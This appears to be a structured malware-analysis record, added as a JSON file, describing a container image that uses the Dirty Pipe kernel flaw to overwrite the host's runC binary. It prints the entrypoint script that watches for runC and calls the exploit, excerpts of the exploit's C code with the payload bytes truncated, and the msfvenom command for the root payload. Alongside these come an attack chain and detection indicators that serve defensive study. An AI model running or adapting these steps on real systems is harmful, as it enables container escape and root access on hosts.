@@ -1,0 +1,127 @@
+{
+  "package_info": {
+    "package_name": "dirtypipe-container-breakout",
+    "package_manager": "container image (OCI/Kubernetes)",
+    "package_versions": "all versions using vulnerable Linux kernels (5.8+), specifically with runC bind-mounted read-only",
+    "why_malicious": "The container image is designed to exploit the Dirty Pipe Linux kernel vulnerability (CVE-2022-0847) to overwrite the runC binary on the host from within an unprivileged container, enabling container escape and host-level privilege escalation."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (container entrypoint)",
+        "file_location": "/wait-for-runc-and-overwrite.sh (container entrypoint script)",
+        "required_permissions": [
+          "filesystem",
+          "process enumeration"
+        ]
+      },
+      "code_snippet": "#!/bin/bash\n\necho '#!/proc/self/exe' > /bin/sh\n\necho \"Waiting for runC to be executed in the container\"\n\nwhile true ; do\n  runC_pid=\"\"\n\n  while [ -z \"$runC_pid\" ] ; do\n\t runC_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')\n  done\n\n  /exploit /proc/${runC_pid}/exe\ndone",
+      "code_language": "shell",
+      "code_behavior": "At runtime, the script waits for a runC process to be executed in the container, then invokes a local exploit binary to overwrite the runC binary on the host via its /proc/<pid>/exe file descriptor, enabling privilege escalation.",
+      "malice_analysis": {
+        "why_suspicious": "The script actively monitors for the runC process and attempts to overwrite its binary, which is not a normal operation for container entrypoints.",
+        "violated_expectations": "Normal container entrypoints should not attempt to overwrite system binaries or monitor for privileged processes to hijack.",
+        "similar_legitimate_use": "Process monitoring for orchestration or health checks, but not for binary overwriting.",
+        "key_indicators": [
+          "Writes to /bin/sh to hijack shell execution",
+          "Monitors for runC process using /proc/self/exe",
+          "Invokes a local exploit targeting /proc/<pid>/exe"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (invoked by entrypoint script)",
+        "file_location": "/exploit (compiled ELF binary, invoked by script)",
+        "required_permissions": [
+          "filesystem (write to /proc/<pid>/exe)",
+          "kernel Dirty Pipe vulnerability"
+        ]
+      },
+      "code_snippet": "// C code (excerpt)\nconst unsigned char malicious_elf_bytes[] = {\n    /*0x7f,*/ 0x45,0x4c,...\n};\nint main(int argc, char **argv) {\n    if (argc != 2) {\n   \t fprintf(stderr, \"Usage: %s /proc/<runc_pid>/exe\\n\", argv[0]);\n   \t return EXIT_FAILURE;\n    }\n    char *path = argv[1];\n    const size_t data_size = sizeof(malicious_elf_bytes);\n    printf(\"[+] hijacking runc..\\n\");\n    if (hax(path, 1, malicious_elf_bytes, data_size) != 0) {\n   \t printf(\"[~] failed\\n\");\n   \t return EXIT_FAILURE;\n    }\n    printf(\"[+] Successfully overwrote runC with our malicious binary!\\n\");\n    return EXIT_SUCCESS;\n}",
+      "code_language": "c",
+      "code_behavior": "At runtime, the exploit binary uses the Dirty Pipe vulnerability to overwrite the runC binary (via /proc/<runc_pid>/exe) with a malicious ELF payload that executes arbitrary commands as root on the host.",
+      "malice_analysis": {
+        "why_suspicious": "Overwriting a privileged system binary from an unprivileged context is a clear privilege escalation attempt.",
+        "violated_expectations": "Normal binaries should not attempt to overwrite system executables, especially via kernel vulnerabilities.",
+        "similar_legitimate_use": "None; writing to /proc/<pid>/exe is not legitimate for user processes.",
+        "key_indicators": [
+          "Direct use of Dirty Pipe exploit primitive",
+          "Writes arbitrary ELF payload to privileged binary",
+          "Targets /proc/<pid>/exe file descriptor"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "post-exploitation (when runC is next executed on the host)",
+        "file_location": "Overwritten /usr/bin/runc (host binary, replaced with malicious ELF)",
+        "required_permissions": [
+          "filesystem (write to /tmp)",
+          "process execution"
+        ]
+      },
+      "code_snippet": "// ELF payload (bytes)\n// msfvenom -a x86 -p linux/x86/exec CMD=\"id > /tmp/hacked && hostname >> /tmp/hacked\" -f elf\n// (first byte omitted due to Dirty Pipe limitation)\nconst unsigned char malicious_elf_bytes[] = { ... };",
+      "code_language": "elf (binary, generated from C/assembly)",
+      "code_behavior": "When runC is executed on the host, the malicious payload runs 'id' and 'hostname' as root, writing their output to /tmp/hacked, demonstrating code execution with elevated privileges.",
+      "malice_analysis": {
+        "why_suspicious": "Replacing a core container runtime binary with a payload that executes arbitrary commands is a textbook privilege escalation and persistence technique.",
+        "violated_expectations": "runC should only perform container runtime operations, not execute arbitrary shell commands or write to /tmp.",
+        "similar_legitimate_use": "None; system binaries should not be replaced with arbitrary payloads.",
+        "key_indicators": [
+          "Malicious ELF payload replaces system binary",
+          "Payload writes to /tmp/hacked as root",
+          "Payload executes system commands (id, hostname)"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker deploys a malicious container image with a script that waits for runC to be executed.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Detection of runC process and preparation for exploitation"
+    },
+    {
+      "step": 2,
+      "action": "Script detects runC process and invokes the Dirty Pipe exploit to overwrite the runC binary on the host via /proc/<runc_pid>/exe.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "runC binary on host is replaced with malicious payload"
+    },
+    {
+      "step": 3,
+      "action": "When runC is next executed (e.g., via kubectl exec), the malicious payload runs as root, executing arbitrary commands and writing output to /tmp/hacked.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Host-level code execution and potential persistence"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Container processes monitoring for runC or /proc/self/exe",
+      "Unprivileged containers writing to /proc/<pid>/exe",
+      "Unexpected overwrites of system binaries (e.g., runC) from container context",
+      "Execution of commands like 'id' and 'hostname' by runC binary"
+    ],
+    "file_indicators": [
+      "/bin/sh replaced with '#!/proc/self/exe'",
+      "Presence of /tmp/hacked with output from 'id' and 'hostname'",
+      "runC binary hash changes unexpectedly",
+      "Malicious ELF payloads present in container filesystem"
+    ],
+    "network_indicators": [
+      "Not directly applicable in this PoC, but exfiltration or C2 could be added in real attacks"
+    ],
+    "how_to_detect": "Monitor for containers that attempt to access or write to /proc/<pid>/exe, especially targeting runC processes. Alert on unexpected changes to the runC binary hash or execution of non-standard commands by runC. Detect the creation of files like /tmp/hacked on the host. Use eBPF or auditd to trace file overwrite attempts from containerized processes. Monitor for containers that replace /bin/sh or other system binaries with symlinks or scripts pointing to /proc/self/exe."
+  }
+}
